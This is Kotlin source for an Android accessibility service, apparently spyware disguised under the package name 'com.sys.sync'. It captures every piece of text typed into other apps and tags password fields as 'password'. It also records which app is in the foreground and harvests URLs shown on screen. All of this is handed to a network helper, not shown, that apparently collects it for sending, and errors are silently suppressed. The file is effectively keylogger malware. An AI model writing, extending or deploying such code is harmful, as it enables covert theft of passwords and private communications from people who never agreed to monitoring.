package com.sys.sync

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AccessService : AccessibilityService() {
    override fun onAccessibilityEvent(e: AccessibilityEvent) {
        try {
            when (e.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = e.text?.joinToString("") ?: return
                    if (text.isBlank()) return
                    val pkg = e.packageName?.toString() ?: ""
                    Net.add(if (e.isPassword) "password" else "text", text, "$pkg|${e.className}")
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = e.packageName?.toString() ?: ""
                    Net.add("app", pkg, e.className?.toString() ?: "")
                    walk(rootInActiveWindow) { n ->
                        val t = n.text?.toString() ?: ""
                        if (t.startsWith("http")) Net.add("web", t, pkg)
                    }
                }
            }
        } catch (_: Exception) {}
    }
    private fun walk(n: AccessibilityNodeInfo?, f: (AccessibilityNodeInfo) -> Unit) {
        if (n == null) return
        f(n)
        for (i in 0 until n.childCount) walk(n.getChild(i), f)
    }
    override fun onInterrupt() {}
}
